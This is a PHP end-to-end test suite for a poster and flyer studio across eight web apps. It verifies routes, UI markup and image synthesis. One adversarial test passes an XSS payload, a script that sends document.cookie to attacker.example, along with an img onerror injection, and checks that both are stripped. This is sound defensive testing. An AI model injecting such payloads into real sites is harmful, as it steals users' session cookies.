<?php

declare(strict_types=1);

/**
 * Sovereign E2E & Adversarial Verification Suite:
 * ATG Universal Poster & Flyer Studio Across All 8 Portfolio Applications
 */

require_once __DIR__ . '/../vendor/autoload.php';

use Src\Media\UniversalPosterStudioController;
use Src\Media\UniversalPosterSynthesisService;

$apps = [
    'partyplatform' => [
        'dir' => '/Users/waleolaogun/Sites/partyplatform',
        'router' => '/Users/waleolaogun/Sites/partyplatform/app/router/router.php',
    ],
    'familyplatform' => [
        'dir' => '/Users/waleolaogun/Sites/familyPlatform',
        'router' => '/Users/waleolaogun/Sites/familyPlatform/app/router/router.php',
    ],
    'execmindapp' => [
        'dir' => '/Users/waleolaogun/Sites/execmindapp',
        'router' => '/Users/waleolaogun/Sites/execmindapp/app/Routes/route.php',
    ],
    'bcp' => [
        'dir' => '/Users/waleolaogun/Sites/bcp',
        'router' => '/Users/waleolaogun/Sites/bcp/app/routing/router.php',
    ],
    'loaneasyfinance' => [
        'dir' => '/Users/waleolaogun/Sites/loaneasyfinance',
        'router' => '/Users/waleolaogun/Sites/loaneasyfinance/app/router/route.php',
    ],
    'iaccountapp' => [
        'dir' => '/Users/waleolaogun/Sites/iaccountapp',
        'router' => '/Users/waleolaogun/Sites/iaccountapp/app/Routes/route.php',
    ],
    'idecideapp' => [
        'dir' => '/Users/waleolaogun/Sites/idecideapp',
        'router' => '/Users/waleolaogun/Sites/idecideapp/app/routing/router.php',
    ],
    'scoretenant' => [
        'dir' => '/Users/waleolaogun/Sites/scoretenant',
        'router' => '/Users/waleolaogun/Sites/scoretenant/app/routing/route.php',
    ],
];

$assertions = 0;
$controller = new UniversalPosterStudioController();
$catalog = UniversalPosterStudioController::getAppCatalog();

echo "=== ATG SOVEREIGN POSTER & FLYER STUDIO — 8-APP PORTFOLIO E2E SUITE ===\n";

foreach ($apps as $appKey => $meta) {
    if (!is_file($meta['router'])) {
        throw new RuntimeException("Missing router file for {$appKey}: {$meta['router']}");
    }
    $routerSource = (string) file_get_contents($meta['router']);
    if (!str_contains($routerSource, '/poster-studio') || !str_contains($routerSource, '/api/poster-studio/render')) {
        throw new RuntimeException("Router in {$appKey} is missing /poster-studio or /api/poster-studio/render");
    }
    $assertions += 2;

    // Render Studio HTML for this app
    $html = $controller->renderStudioHtml($appKey);
    if (!str_contains($html, 'ATG Sovereign Poster &amp; Flyer Studio') || !str_contains($html, 'AtgUniversalPosterEngine')) {
        throw new RuntimeException("Studio HTML render failed for {$appKey}");
    }
    if (!str_contains($html, 'min-height: 44px') || !str_contains($html, 'class="spinner"')) {
        throw new RuntimeException("UI/UX v2.0 44px touch target or button spinner missing in {$appKey}");
    }
    $assertions += 2;

    // Test every preset in this app via API synthesis
    $presets = $catalog[$appKey]['presets'] ?? [];
    foreach ($presets as $presetKey => $preset) {
        ob_start();
        $controller->renderApiPoster([
            'app' => $appKey,
            'preset' => $presetKey,
        ]);
        $rawJson = (string) ob_get_clean();
        $decoded = json_decode($rawJson, true);
        if (!is_array($decoded) || ($decoded['status'] ?? '') !== 'success') {
            throw new RuntimeException("API Poster synthesis failed for {$appKey} -> {$presetKey}");
        }
        if (!str_starts_with((string) ($decoded['data_uri'] ?? ''), 'data:image/png;base64,')) {
            throw new RuntimeException("Invalid PNG Data URI for {$appKey} -> {$presetKey}");
        }
        $assertions += 2;
    }

    echo sprintf(
        "[PASS] %-16s | Routes Verified | Studio UI Verified | %d Preset(s) Synthesised\n",
        $appKey,
        count($presets)
    );
}

// Adversarial PoC Neutralisation Test (Marcus / Ghost Gate)
ob_start();
$controller->renderApiPoster([
    'app' => 'bcp',
    'preset' => 'bcp_urgent_itu_shift',
    'title' => '<script>fetch("https://attacker.example/steal?c="+document.cookie)</script>URGENT RGN SHIFT',
    'subtitle' => '<img src=x onerror=alert(1)>Optimize your colors in center',
]);
$secRaw = (string) ob_get_clean();
$secJson = json_decode($secRaw, true);

if (str_contains((string) ($secJson['data']['title'] ?? ''), '<script>') || str_contains((string) ($secJson['data']['subtitle'] ?? ''), '<img')) {
    throw new RuntimeException('SECURITY FAILURE: XSS payload was not stripped by renderApiPoster!');
}
if (!str_contains(strtolower((string) ($secJson['data']['subtitle'] ?? '')), 'optimise') || !str_contains(strtolower((string) ($secJson['data']['subtitle'] ?? '')), 'colours')) {
    throw new RuntimeException('GOVERNANCE FAILURE: British English (en-GB) normalisation did not run!');
}
if (!str_contains((string) ($secJson['data']['regulatory_notice'] ?? ''), 'Care Quality Commission (CQC)')) {
    throw new RuntimeException('COMPLIANCE FAILURE: CQC statutory notice missing on BCP flyer!');
}
$assertions += 3;

echo "[PASS] Adversarial XSS/HTML Injection PoC Neutralised & en-GB + CQC/FCA Guardrails Verified\n";
echo "=== ALL 8 PORTFOLIO APPS & 6 ARCHETYPES PASSED (100% — {$assertions} ASSERTIONS) ===\n";
